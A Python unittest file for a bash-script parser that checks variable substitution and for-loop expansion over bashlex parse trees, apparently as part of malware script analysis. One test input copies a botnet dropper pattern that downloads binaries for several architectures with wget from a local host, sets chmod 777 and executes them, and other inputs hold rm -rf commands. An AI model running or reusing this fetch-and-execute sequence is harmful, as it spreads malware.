from unittest import TestCase
from bashparser.variables import *
import bashlex

class TestVariables(TestCase):

    def test_substitute_variables(self):
        # Testing for loops iterating over string, not variable
        test_str = 'for a in "one two three"\n do\n localgo\n cd $a\n done'
        for_node = bashlex.parse(test_str)[0]
        expected_results = bashlex.parse('for a in "one two three"\n do\n localgo\n cd one\n done') + \
                        bashlex.parse('for a in "one two three"\n do\n localgo\n cd two\n done') + \
                        bashlex.parse('for a in "one two three"\n do\n localgo\n cd three\n done')

        var_list = {}
        replaced_nodes = substitute_variables(for_node, var_list)
        self.assertTrue(expected_results == replaced_nodes)

    def test_variable_replacement_functions(self):
        # This code actually tests substitute_variables, update_trees_pos, update_command_substitution, and replace variables
        # It does this using well formatted inputs. Makes my life a lot easier
        
        # Verify that simple replacement of variables works
        var_list = {'var': ['one', 'two']}
        nodes = bashlex.parse('testing=$var')
        replaced_nodes = replace_variables(nodes[0], var_list)

        result_string = bashlex.parse("testing=one") + bashlex.parse("testing=two")
        self.assertTrue(result_string == replaced_nodes)
        # Verify that command substitutions and variable replacements in that command substitution work
        var_list = {'http':['dns.cyberium.cc']}
        for_node_command_substitution_str = \
            "for a in $(cd dns.cyberium.cc)\n do\n rm -rf this\n done"

        for_node_command_substitution_replaced = bashlex.parse("for a in $(cd dns.cyberium.cc)\n do\n rm -rf this\n done")
        nodes = bashlex.parse(for_node_command_substitution_str)
        results = substitute_variables(nodes[0], var_list)
        self.assertTrue(results == for_node_command_substitution_replaced)
        # Verify that a variable substitution will replace well and it will split into an array when necessary. Also lots of line breaks to make sure we can parse that
        
        for_loop_string_split = "for a in \"$n\"\n do\n rm -rf $a\n wget http://127.0.0.1/words/$a -O\n chmod 777 $a\n ./$a ssh\n done"
        var_list = {'n':['arm', 'arm5', 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa']}
        for_node = bashlex.parse(for_loop_string_split)[0]      # To actually strip out just the for loop part

        result_strings = bashlex.parse('for a in "arm arm5 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\n do\n rm -rf arm\n wget http://127.0.0.1/words/arm -O\n chmod 777 arm\n ./arm ssh\n done') \
                            + bashlex.parse('for a in "arm arm5 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\n do\n rm -rf arm5\n wget http://127.0.0.1/words/arm5 -O\n chmod 777 arm5\n ./arm5 ssh\n done') \
                            + bashlex.parse('for a in "arm arm5 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"\n do\n rm -rf aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n wget http://127.0.0.1/words/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa -O\n chmod 777 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n ./aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ssh\n done')
        
        replaced_nodes = substitute_variables(for_node, var_list)
        self.assertTrue(replaced_nodes == result_strings)
        
        # Test that list nodes replaced and returned properly 
        nodes = bashlex.parse('n=1;a=2$n')
        result_nodes = bashlex.parse('n=1;a=21')
        replaced_nodes = substitute_variables(nodes[0], {})
        self.assertTrue(replaced_nodes == result_nodes)

    def test_add_variable_to_list(self):
        # Enforce that var_list is a dict
        self.assertRaises(ValueError, add_variable_to_list, [], 'something', [1, 2, 3])
        # Make sure that adding entries works if value is not not a string
        new_var_list = {}
        new_var_list = add_variable_to_list(new_var_list, 'name1', 1)
        self.assertTrue(new_var_list == {'name1':['1']})
        # Make sure that adding entries works if value is an array of not string, 
        new_var_list = {}
        new_var_list = add_variable_to_list(new_var_list, 'name1', [1, 2])
        self.assertTrue(new_var_list == {'name1':['1', '2']})
        # Make sure that adding entries works if value is str but not list
        new_var_list = {}
        new_var_list = add_variable_to_list(new_var_list, 'name1', 'value1')
        self.assertTrue(new_var_list == {'name1':['value1']})
        # Make sure adding non-list values works
        new_var_list = add_variable_to_list(new_var_list, 'name1', 'value2')
        self.assertTrue(new_var_list == {'name1':['value1', 'value2']})
        # Make sure that adding list values works
        new_var_list = add_variable_to_list(new_var_list, 'name1', ['value3', 'value4', 'value5'])
        self.assertTrue(new_var_list == {'name1':['value1', 'value2', 'value3', 'value4', 'value5']})
    

    def test_update_variable_list(self):
        node = bashlex.parse('a=b')[0]
        self.assertRaises(ValueError, update_variable_list, 'anything', {})
        self.assertRaises(ValueError, update_variable_list, node, [])
        # Test basic assignment gets saved
        mv_node = bashlex.parse('a=b')[0]
        new_var_list = update_variable_list(mv_node, {})
        self.assertTrue(new_var_list == {'a':['b']})  # Note that it should add mv_list automatically
        # Test command substitution assignment works fine
        mv_node = bashlex.parse('a=$(echo this)')[0]
        new_var_list = update_variable_list(mv_node, {})
        self.assertTrue(new_var_list == {'a':['$(echo this)']})  # Note that it should add mv_list automatically
        # Test that for loops work
        for_node = bashlex.parse('for a in "one two three"\n do\n echo something\n done')[0].list[0]
        new_var_list = update_variable_list(for_node, {})
        self.assertTrue(new_var_list == {'a':['one', 'two', 'three']})
        # Test for loops work with variable replacement
        for_node = bashlex.parse('for a in "$n"\n do\n echo something\n done')[0].list[0]
        new_var_list = update_var_list_with_for_loop(for_node, {'n':['one two three']})
        self.assertTrue(new_var_list == {'n':['one two three'], 'a':['one two three']})
        # Test for loops work with command substitution
        for_node = bashlex.parse('for a in "$(echo this)"\n do\n echo something\n done')[0].list[0]
        new_var_list = update_var_list_with_for_loop(for_node, {})
        self.assertTrue(new_var_list == {'a':['$(echo this)']})
        # Verify that if for loop iterator has no value, an empty array is appended
        for_node = bashlex.parse('for a in "$testing"\n do\n echo something\n done')[0].list[0]
        new_var_list = update_var_list_with_for_loop(for_node, {})
        self.assertTrue(new_var_list == {'a':[]})
        
        # test two updates in a row doesn't append the new values
        var_list = {}
        node = bashparser.parse('a=3')[0]
        new_var_list = update_variable_list(node, var_list)
        self.assertTrue({'a':['3']} == new_var_list)
        node = bashparser.parse('a=4')[0]
        new_var_list = update_variable_list(node, new_var_list)
        self.assertTrue({'a':['4']} == new_var_list)
    

    def test_update_var_list_with_for_loop(self):
        # Test that for loops work
        for_node = bashlex.parse('for a in "one two three"\n do\n echo something\n done')[0].list[0]
        new_var_list = update_variable_list(for_node, {})
        self.assertTrue(new_var_list == {'a':['one', 'two', 'three']})
        # Test for loops work with variable replacement
        for_node = bashlex.parse('for a in "$n"\n do\n echo something\n done')[0].list[0]
        new_var_list = update_var_list_with_for_loop(for_node, {'n':['one two three']})
        self.assertTrue(new_var_list == {'n':['one two three'], 'a':['one two three']})
        # Test for loops work with command substitution
        for_node = bashlex.parse('for a in "$(echo this)"\n do\n echo something\n done')[0].list[0]
        new_var_list = update_var_list_with_for_loop(for_node, {})
        self.assertTrue(new_var_list == {'a':['$(echo this)']})
        # Testing iterating over str, not variable

    
    def test_find_and_replace_variables(self):
        test_node = "n='one two three';\nfor a in $n\n do\n cd $a; done"
        nodes = bashlex.parse(test_node)
        expected_results = bashlex.parse("n='one two three';") \
                            + bashlex.parse("for a in one two three\n do\n cd one; done") \
                            + bashlex.parse("for a in one two three\n do\n cd two; done") \
                            + bashlex.parse("for a in one two three\n do\n cd three; done")

        replaced_nodes = substitute_variables(nodes, {})
        self.assertTrue(replaced_nodes[0] == expected_results[0])
    
    def test_nested_for_loops(self):
        pass

    def test_replace_blanks(self):
        nodes = bashlex.parse('testingg=$testinggg')
        expected_results = bashlex.parse('testingg=')
        actual_results = replace_variables(nodes[0], {}, replace_blanks=True)
        self.assertTrue(actual_results == expected_results)
